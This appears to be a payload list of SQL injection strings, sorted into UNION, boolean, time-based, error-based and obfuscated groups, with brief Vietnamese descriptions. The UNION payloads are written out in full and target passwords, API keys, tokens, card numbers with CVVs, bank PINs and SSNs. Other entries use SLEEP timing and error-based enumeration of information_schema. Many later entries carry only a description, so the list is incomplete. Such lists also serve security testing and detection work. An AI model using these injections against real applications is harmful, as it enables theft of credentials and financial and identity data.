name: SQLi UNION #001
payload: id=1 UNION SELECT username, password FROM users -- 001
description: Union select cơ bản nhằm trích xuất tài khoản.

name: SQLi UNION #002
payload: item=2 UNION SELECT email, pass_hash FROM members -- 002
description: Khai thác bảng members thông qua UNION.

name: SQLi UNION #003
payload: product=3 UNION ALL SELECT credit_card, cvv FROM payments -- 003
description: Union all để truy cập dữ liệu thẻ.

name: SQLi UNION #004
payload: uid=4 UNION SELECT login, password FROM admin_users -- 004

name: SQLi UNION #005
payload: page=5 UNION SELECT username, api_key FROM api_clients -- 005

name: SQLi UNION #006
payload: pid=6 UNION SELECT name, secret FROM secrets_store -- 006
description: Union lấy dữ liệu trong bảng secrets.

name: SQLi UNION #007
payload: doc=7 UNION SELECT author, password FROM editors -- 007

name: SQLi UNION #008
payload: post=8 UNION SELECT username, token FROM social_accounts -- 008
description: Union nhắm tới token mạng xã hội.

name: SQLi UNION #009
payload: ref=9 UNION SELECT customer_id, pin FROM banking_users -- 009
description: Union lấy mã PIN ngân hàng.

name: SQLi UNION #010
payload: ord=10 UNION SELECT card_number, expiry FROM orders -- 010
description: Union lấy thông tin thẻ từ bảng orders.

name: SQLi UNION #011
payload: entry=11 UNION SELECT login_name, passphrase FROM employees -- 011
description: Union truy xuất đăng nhập nhân viên.

name: SQLi UNION #012
payload: row=12 UNION SELECT email, password FROM newsletter_subs -- 012
description: Union truy cập dữ liệu newsletter.

name: SQLi UNION #013
payload: article=13 UNION SELECT username, hash FROM cms_users -- 013
description: Union lấy hash người dùng CMS.

name: SQLi UNION #014
payload: invoice=14 UNION SELECT account, routing FROM banking_details -- 014
description: Union lấy thông tin tài khoản ngân hàng.

name: SQLi UNION #015
payload: order_id=15 UNION SELECT ssn, dob FROM customers -- 015
description: Union thu thập SSN và ngày sinh.

name: SQLi UNION #016
payload: ticket=16 UNION SELECT username, password FROM helpdesk_users -- 016
description: Union khai thác hệ thống helpdesk.

name: SQLi UNION #017
payload: profile=17 UNION SELECT login, pass FROM staff -- 017
description: Union truy cập thông tin staff.

name: SQLi UNION #018
payload: cid=18 UNION SELECT email, password FROM crm_accounts -- 018

name: SQLi UNION #019
payload: index=19 UNION SELECT username, pass_hash FROM forum_users -- 019
description: Union lấy hash từ diễn đàn.

name: SQLi UNION #020
payload: report=20 UNION SELECT operator, passkey FROM system_users -- 020

name: SQLi Boolean #022
description: Bypass xác thực với biểu thức đúng.

name: SQLi Boolean #024
description: Thử đăng nhập với điều kiện luôn đúng.

name: SQLi Boolean #032
description: Sử dụng EXISTS để trả TRUE.

name: SQLi Boolean #035
description: Chèn dấu ngoặc để đóng câu lệnh.

name: SQLi Boolean #036
description: Sử dụng LIKE để luôn đúng.

name: SQLi Time #045
payload: cid=45' AND (SELECT 1 FROM dual WHERE SLEEP(2))--

name: SQLi Time #046
description: Sử dụng hàm PG_SLEEP trên PostgreSQL.

name: SQLi Time #049
description: Sleep trực tiếp trong comment hash.

name: SQLi Time #052
payload: log=52 AND (SELECT 1 FROM users WHERE SLEEP(3))
description: Sleep khi truy cập bảng users.

name: SQLi Time #053
payload: idx=53' OR IF((SELECT COUNT(*) FROM admins)>0,SLEEP(2),0)--
description: Time-based kiểm tra tồn tại admins.

name: SQLi Time #057
payload: report=57' OR CASE WHEN (SELECT database()) IS NOT NULL THEN SLEEP(2) END--

name: SQLi Time #059
description: Sử dụng IFNULL để tạo sleep.

name: SQLi Time #060
description: Tấn công time-based bằng tải nặng SQLite.

name: SQLi Error #063
description: Gây lỗi chia cho 0 để lộ thông tin.

name: SQLi Error #065
payload: product=65 AND cast((SELECT user()) AS int)

name: SQLi Error #066
payload: doc=66 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT version())a)
description: Lỗi subselect với kiểu dữ liệu khác.

name: SQLi Error #067
payload: row=67 AND (SELECT name_const('a',1) FROM information_schema.tables GROUP BY 1)

name: SQLi Error #068
payload: page=68 AND (SELECT column_name FROM information_schema.columns GROUP BY column_name HAVING MIN(1)=MAX(0))

name: SQLi Error #069
payload: post=69 AND (SELECT 1 FROM dual WHERE (SELECT 1 FROM users LIMIT 1)=2)

name: SQLi Error #070
payload: note=70 AND (SELECT TOP 1 table_name FROM information_schema.tables WHERE 1=CONVERT(int,'a'))

name: SQLi Error #071
payload: record=71 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))a FROM information_schema.tables GROUP BY a)b)

name: SQLi Error #072
payload: token=72 AND (SELECT TRIM(CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1))))--
description: Trích dữ liệu qua lỗi concat.

name: SQLi Error #074
payload: entry=74 AND (SELECT CAST((SELECT user()) AS numeric))

name: SQLi Error #075
payload: key=75 AND (SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() GROUP BY 1)
description: Group by lỗi do dữ liệu không hợp lệ.

name: SQLi Error #078
payload: node=78 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE' HAVING 1=2)
description: Điều kiện HAVING sai gây error.

name: SQLi Error #079
description: Hàm hình học gây lỗi trong MySQL.

name: SQLi Error #080
description: SQL Server XML cast gây lỗi.

name: SQLi Obfuscated #081
description: Sử dụng comment chèn giữa từ khóa.

name: SQLi Obfuscated #087
description: Dữ liệu trả về ở dạng hex.

name: SQLi Obfuscated #089
description: Dùng CHAR() để xây dựng từ khóa.

name: SQLi Obfuscated #090
description: Union đọc file qua UNC path.

name: SQLi Obfuscated #093
description: Kết thúc bằng comment để bỏ phần sau.

name: SQLi Obfuscated #095
description: Stacked query gọi stored procedure nguy hiểm.

name: SQLi Obfuscated #100
description: Oracle XMLTYPE với chr() để né detection.
